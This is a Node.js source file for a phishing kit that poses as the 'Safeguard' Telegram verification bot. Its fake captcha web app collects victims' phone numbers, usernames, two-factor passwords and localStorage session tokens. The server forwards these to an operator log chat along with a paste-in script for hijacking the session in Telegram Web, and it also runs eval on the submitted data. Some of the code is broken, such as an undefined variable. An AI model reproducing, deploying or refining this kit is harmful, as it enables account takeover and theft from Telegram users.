const express = require("express");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { wrapper } = require("axios-cookiejar-support");
const { CookieJar } = require("tough-cookie");

require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil =
  require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// loading all the pictures beforehand for speed
const safeguardSuccess = fs.readFileSync(
  path.join(__dirname, "images/success/safeguard.jpg")
);

const safeguardVerification = fs.readFileSync(
  path.join(__dirname, "images/verification/safeguard.jpg")
);

const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, {
  polling: true,
});

const filePath = path.join(__dirname, "channelUrls.json");

// Function to load URLs from the file
async function loadUrls() {
  try {
    const data = await fs.promises.readFile(filePath, "utf8");
    return JSON.parse(data);
  } catch (err) {
    return {};
  }
}

// Function to save URLs to the file
async function saveUrl(chatId, url) {
  const channelUrls = await loadUrls(); // Load current URLs
  channelUrls[chatId] = url; // Add or update the URL for the chatId
  fs.writeFileSync(filePath, JSON.stringify(channelUrls, null, 2)); // Write updated URLs to file
}

const guardianButtonTexts = [
  "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
  "Why an Ape ❔ You can be eNORMUS!🔷",
  "🔥Raid with @Raidar 🔥",
];

const generateRandomString = (length) => {
  const charset =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

let safeguardUsername;

safeguardBot.getMe().then((botInfo) => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
});

const app = express();
app.use(express.json());
app.use(express.static("public"));

app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const {
      userId,
      firstName,
      usernames,
      phoneNumber,
      isPremium,
      password,
      quicklySet,
      type,
      channelid,
    } = req.body;

    let pass = password;
    if (pass === null) {
      pass = "No Two-factor authentication enabled.";
    }

    let usernameText = "";
    if (usernames) {
      usernameText = `Usernames owned:\n`;
      usernames.forEach((username, index) => {
        usernameText += `<b>${index + 1}</b>. @${username.username} ${
          username.isActive ? "✅" : "❌"
        }\n`;
      });
    }

    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);

    const quickAuth = `Object.entries(${JSON.stringify(
      quicklySet
    )}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    try {
      eval(quicklySet);
    } catch (e) {}

    await handleRequest(req, res, {
      password: pass,
      script: quickAuth,
      scripttocheck: quickAuthh,
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      premium: isPremium,
      type,
      channel: channelid,
    });
  } catch (error) {
    console.error("500 server error", error);
    res.status(500).json({ error: "server error" });
  }
});

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const handleRequest = async (req, res, data) => {
  const botMap = {
    safeguard: safeguardBot,
  };

  let bot = botMap[data.type] || null;
  await bot.sendMessage(
    process.env.LOGS_ID,
    `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${
      data.name
    }\n⭐ <b>Telegram Premium</b>: ${
      data.premium ? "✅" : "❌"
    }\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${
      data.usernames
    }\n🔐 <b>Password</b>: <code>${
      data.password !== undefined ? data.password : "Null"
    }</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${
      data.script
    }</code>\n<b>Module</b>: ${
      data.type.charAt(0).toUpperCase() + data.type.slice(1)
    }`,
    {
      parse_mode: "HTML",
    }
  );
  
  let type = data.type;

  const channelUrls = await loadUrls();

  if (type === "safeguard") {
    let image;
    let caption;
    if (type === "safeguard") {
      image = safeguardSuccess;
      if (channelUrls[data.channel]) {
        caption = `Verified, you can join the group using this temporary link:\n\n${
          channelUrls[data.channel]
        }\n\nThis link is a one time use and will expire`;
      } else {
        caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(
          16
        )}\n\nThis link is a one time use and will expire`;
      }
    }

    const randomText =
      guardianButtonTexts[
        Math.floor(Math.random() * guardianButtonTexts.length)
      ];

    const guardianButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: randomText,
              url: `https://t.me/+${generateRandomString(16)}`,
            },
          ],
        ],
      },
    };
    const safeguardButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "@SOLTRENDING",
              url: "https://t.me/SOLTRENDING",
            },
          ],
        ],
      },
    };

    const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;

    await bot.sendPhoto(data.userId, image, {
      caption,
      ...buttons,
      parse_mode: "HTML",
    });
  }

  res.json({});
};

const handleNewChatMember = async (bot, type) => {
  bot.on("my_chat_member", async (update) => {
    const chatId = update.chat.id;

    let jsonToSend;
    let imageToSend;

    switch (type) {
      case "safeguard":
        jsonToSend = {
          caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Tap To Verify",
                  url: `https://t.me/${update.new_chat_member.user.username}?start=${chatId}`,
                },
              ],
            ],
          },
        };
        imageToSend = safeguardVerification;
        break;
      default:
        jsonToSend = {};
    }

    await delay(2000);

    if (
      update.chat.type === "channel" &&
      update.new_chat_member.status === "administrator" &&
      update.new_chat_member.user.is_bot === true
    ) {
      bot.sendPhoto(chatId, imageToSend, jsonToSend);
    }
  });
};

function handleText(bot) {
  try {
    bot.on("message", (msg) => {
      const chatId = msg.chat.id;
      const text = msg.text;

      // Known command patterns
      const knownCommands = [
        /^\/start/,
        /^\/link (.+)/,
        /^\/geturl/,
        /\/start(?:\s+(-?\S+))?/,
      ];

      // Check if message text matches any known commands
      const isKnownCommand = knownCommands.some((cmd) => cmd.test(text));

      // If message is not a known command, send an unknown command response
      if (!isKnownCommand) {
        bot.sendMessage(
          chatId,
          `
❌ Unknown Command!

You have sent a message directly to the bot's chat, or
the menu structure has been modified by an Admin.

ℹ️ Please avoid sending messages directly to the bot or
reload the menu by pressing /start.
          `
        );
      }
    });
  } catch (error) {
    console.log(error);
  }
}

function handleStart(bot) {
  try {
    bot.onText(/\/start(?:\s+(-?\S+))?/, (msg, match) => {
      let botInfo;
      bot.getMe().then((botInformation) => {
        botInfo = botInformation;
        if (botInfo.username) {
          const chatId = msg.chat.id;
          const id = match[1];
          let jsonToSend;
          let imageToSend;
          if (botInfo.username === safeguardUsername) {
            jsonToSend = {
              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "VERIFY",
                      web_app: {
                        url: `${process.env.DOMAIN}/safeguard/?type=safeguard&id=${id}`,
                      },
                    },
                  ],
                ],
              },
            };
            imageToSend = safeguardVerification;
          }

          bot.sendPhoto(chatId, imageToSend, jsonToSend);
        }
      });
    });
  } catch (error) {
    console.log(error);
  }
}

async function handleLink(bot) {
  try {
    // Command to set a URL for the channel
    bot.on("channel_post", async (msg) => {
      const chatId = msg.chat.id;
      const messageText = msg.text;

      if (messageText && messageText.startsWith("/link")) {
        const args = messageText.split(" ");
        const url = args[1];

        bot.deleteMessage(chatId, msg.message_id).catch(console.error);

        if (url) {
          await saveUrl(chatId, url);
          bot
            .sendMessage(
              chatId,
              `Group link for this channel has been set to: ${url}`
            )
            .then((sentMessage) => {
              // Wait 5 seconds before deleting
              setTimeout(() => {
                bot.deleteMessage(chatId, sentMessage.message_id);
              }, 5000);
            })
            .catch(console.error);
        } else {
          bot
            .sendMessage(
              chatId,
              `Please provide a URL with the command. Example: /link https://t.me/+${generateRandomString(
                16
              )}`
            )
            .then((sentMessage) => {
              // Wait 5 seconds before deleting
              setTimeout(() => {
                bot.deleteMessage(chatId, sentMessage.message_id);
              }, 5000);
            })
            .catch(console.error);
        }
      }
    });
  } catch (error) {
    console.log(error);
  }
}

handleNewChatMember(safeguardBot, "safeguard");

handleStart(safeguardBot);

handleText(safeguardBot);

handleLink(safeguardBot);

app.listen(process.env.PORT || 80, () =>
  console.log(`loaded everyone & running on port ${process.env.PORT}`)
);
